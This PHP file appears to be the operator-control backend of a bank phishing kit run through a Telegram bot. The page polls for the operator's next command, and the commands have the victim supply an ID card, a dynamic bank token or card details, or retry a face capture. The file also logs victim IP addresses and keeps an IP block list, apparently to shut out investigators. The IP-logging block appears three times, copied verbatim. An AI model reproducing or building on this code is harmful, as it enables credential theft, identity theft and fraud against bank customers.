<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$blacklist_file = file_exists(__DIR__ . '/blocked_ips.txt') ? __DIR__ . '/blocked_ips.txt' : (file_exists(dirname(dirname(__DIR__)) . '/blocked_ips.txt') ? dirname(dirname(__DIR__)) . '/blocked_ips.txt' : (file_exists(dirname(dirname(dirname(__DIR__))) . '/blocked_ips.txt') ? dirname(dirname(dirname(__DIR__))) . '/blocked_ips.txt' : __DIR__ . '/blocked_ips.txt'));
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

session_start();
header('Content-Type: application/json');

$configPath = __DIR__ . '/../../config.php';
if (!file_exists($configPath)) {
    echo json_encode(['action' => null, 'error' => 'Falta config.php']);
    exit;
}

$config = require $configPath;

$transactionId = $_POST['transactionId'] ?? '';

// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
$messageId     = $_POST['messageId'] ?? '';

if (!$transactionId || !$messageId) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

// Clave única para cada combinación transactionId + messageId
$sessionKey = 'processed_' . md5($transactionId . $messageId);

// Si ya procesamos esta combinación, no procesar de nuevo
if (!empty($_SESSION[$sessionKey])) {
    echo json_encode(['action' => null]);
    exit;
}

// Verificación por sesión (webhook interno)
if (
    isset($_SESSION['current_transaction'], $_SESSION['current_action']) &&
    $_SESSION['current_transaction'] === $transactionId
) {
    $act = $_SESSION['current_action'];
    unset($_SESSION['current_transaction'], $_SESSION['current_action']);
    echo json_encode(['action' => $act]);
    exit;
}

$action = null;
$baseTransactionDir = dirname(__DIR__, 2);
$projectRoot = dirname(__DIR__, 5);
$actionDirs = [
    $baseTransactionDir . '/actions',
    $projectRoot . '/datac/actions',
    __DIR__ . '/actions'
];

if (is_dir($baseTransactionDir)) {
    foreach (glob($baseTransactionDir . '/b-*', GLOB_ONLYDIR) as $bankDir) {
        $actionDirs[] = $bankDir . '/actions';
        foreach (['/inicio', '/info', '/login', '/wps'] as $subDir) {
            $candidateDir = $bankDir . $subDir . '/actions';
            if (is_dir($bankDir . $subDir)) {
                $actionDirs[] = $candidateDir;
            }
        }
    }
}

$actionDirs = array_values(array_unique(array_filter($actionDirs, static function ($dir) {
    return $dir !== '';
})));

$actionFileName = preg_replace('/[^a-zA-Z0-9_-]/', '', (string) $transactionId) . '.txt';
foreach ($actionDirs as $actionDir) {
    if (!is_dir($actionDir)) {
        continue;
    }

    $actionFile = $actionDir . '/' . $actionFileName;
    if (!file_exists($actionFile)) {
        continue;
    }

    $pendingAction = trim((string) file_get_contents($actionFile));
    if ($pendingAction !== '') {
        $action = $pendingAction;
        @unlink($actionFile);
        break;
    }
}

if ($action !== null) {
    if (!empty($config['bot_token']) && !empty($config['chat_id'])) {
        $accionHumana = match ($action) {
            'error'             => '📸 REINTENTAR CARA (Error)',
            'cedula'            => '🪪 PEDIR CÉDULA',
            'error_logo'        => '❌ Error de LOGO',
            'error_cajero'      => '🏧 Error de CAJERO',
            'pedir_dinamica'    => '🔑 Pedir DINÁMICA',
            'error_dinamica'    => '⚠️ Error de DINÁMICA',
            'confirm_finalizar' => '🏁 FINALIZAR',
            'tarjeta'           => '💳 Redirigir a TARJETA',
            default             => 'Acción desconocida'
        };

        $payload = [
            'chat_id' => $config['chat_id'],
            'message_id' => $messageId,
            'text' => "✅ Acción: {$accionHumana}",
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => [
                [
                    ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$transactionId}"]
                ]
            ]])
        ];

        $editCh = curl_init('https://api.telegram.org/bot' . $config['bot_token'] . '/editMessageText');
        curl_setopt($editCh, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($editCh, CURLOPT_POST, true);
        curl_setopt($editCh, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($editCh, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($editCh);
        curl_close($editCh);
    }

    $_SESSION[$sessionKey] = true;
    echo json_encode(['action' => $action]);
    exit;
}

// Fallback: si el webhook no dejó archivos aún, intentar con polling legacy.
$offset = $_SESSION['last_update_id'] ?? 0;
$url = 'https://api.telegram.org/bot' . $config['bot_token'] . '/getUpdates?offset=' . ($offset + 1);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);

if (!empty($data['result'])) {
    foreach ($data['result'] as $update) {
        $_SESSION['last_update_id'] = $update['update_id'];

        if (!isset($update['callback_query']['data'])) continue;
        if (strpos($update['callback_query']['data'], $transactionId) === false) continue;

        $parts = explode(':', $update['callback_query']['data']);
        $actionType = $parts[0];

        $allowed = [
            'error',
            'cedula',
            'error_logo',
            'error_cajero',
            'pedir_dinamica',
            'error_dinamica',
            'confirm_finalizar',
            'tarjeta',
            'error_cc',
            'logo',
            'dinamica'
        ];

        if (!in_array($actionType, $allowed)) continue;

        $action = $actionType;
        $_SESSION[$sessionKey] = true;
        break;
    }
}

echo json_encode(['action' => $action]);
